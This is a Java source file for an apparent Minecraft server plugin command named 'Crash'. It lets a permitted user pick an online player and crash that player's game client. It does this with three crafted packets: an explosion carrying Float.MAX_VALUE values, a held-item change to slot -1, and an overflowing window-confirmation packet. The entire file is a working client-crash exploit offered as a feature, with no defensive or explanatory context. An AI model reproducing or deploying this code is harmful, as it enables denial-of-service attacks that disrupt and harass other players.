package cn.ChengZhiYa.MHDFTools.command.feature;

import cn.ChengZhiYa.MHDFTools.command.AbstractCommand;
import cn.ChengZhiYa.MHDFTools.manager.init.PluginHookManager;
import cn.ChengZhiYa.MHDFTools.util.config.ConfigUtil;
import cn.ChengZhiYa.MHDFTools.util.config.LangUtil;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.util.Vector3f;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerExplosion;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerHeldItemChange;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerWindowConfirmation;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

@SuppressWarnings("unused")
public final class Crash extends AbstractCommand {
    public Crash() {
        super(
                "crashSettings.enable",
                "崩溃玩家客户端",
                "mhdftools.commands.crash",
                false,
                ConfigUtil.getConfig().getStringList("crashSettings.commands").toArray(new String[0])
        );
    }

    @Override
    public void execute(@NotNull CommandSender sender, @NotNull String label, @NotNull String[] args) {
        // 无指定崩溃类型,使用默认崩溃类型
        if (args.length >= 1) {
            Player player = Bukkit.getPlayer(args[0]);
            if (player == null) {
                sender.sendMessage(LangUtil.i18n("playerOffline"));
                return;
            }

            String type;
            if (args.length == 1) {
                type = ConfigUtil.getConfig().getString("crashSettings.defaultType");
            } else {
                type = args[1];
            }

            if (type != null && crashPlayerClient(player, type)) {
                sender.sendMessage(LangUtil.i18n("commands.crash.sendDone")
                        .replace("{type}", LangUtil.i18n("commands.crash.types." + type))
                );
            } else {
                sender.sendMessage(LangUtil.i18n("commands.crash.typeNotExists"));
            }
            return;
        }

        // 输出帮助信息
        {
            sender.sendMessage(
                    LangUtil.i18n("usageError")
                            .replace("{usage}", LangUtil.i18n("commands.crash.usage"))
                            .replace("{command}", label)
            );
        }
    }

    @Override
    public List<String> tabCompleter(@NotNull CommandSender sender, @NotNull String label, @NotNull String[] args) {
        if (args.length == 1) {
            return Bukkit.getOnlinePlayers().stream().map(Player::getName).toList();
        }
        if (args.length == 2) {
            return Arrays.asList("explosion", "changeHoldItem", "serverWindowConfirmation");
        }
        return new ArrayList<>();
    }

    /**
     * 崩溃玩家客户端
     *
     * @param player    被崩溃的玩家对象
     * @param crashType 崩溃类型
     * @return 崩溃类型是否存在
     */
    private boolean crashPlayerClient(Player player, String crashType) {
        // 爆炸溢出
        if (crashType.equalsIgnoreCase("explosion")) {
            PluginHookManager.getPacketEventsHook().sendPacket(player,
                    new WrapperPlayServerExplosion(
                            new Vector3d(Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE),
                            Float.MAX_VALUE,
                            new ArrayList<>(),
                            new Vector3f(Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE)
                    )
            );
            return true;
        }

        // 手持物品溢出
        if (crashType.equalsIgnoreCase("changeHoldItem")) {
            PluginHookManager.getPacketEventsHook().sendPacket(player,
                    new WrapperPlayServerHeldItemChange(
                            -1
                    )
            );
            return true;
        }

        // 延迟包溢出
        if (crashType.equalsIgnoreCase("serverWindowConfirmation")) {
            PluginHookManager.getPacketEventsHook().sendPacket(player,
                    new WrapperPlayServerWindowConfirmation(
                            Float.MAX_EXPONENT,
                            (short) Float.MAX_EXPONENT,
                            false
                    )
            );
            return true;
        }
        return false;
    }
}
